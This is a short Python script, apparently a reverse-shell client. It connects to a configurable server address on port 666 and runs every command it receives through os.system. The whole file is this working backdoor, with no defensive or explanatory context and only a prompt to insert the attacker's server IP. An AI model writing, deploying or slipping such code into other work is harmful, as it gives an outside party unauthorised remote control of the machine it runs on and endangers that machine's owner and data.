import socket
import os

srvip = "127.0.0.1" #put your server IP here
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((srvip, 666))
while True:
	cmd = s.recv(1024).decode("utf-8")
	os.system(cmd)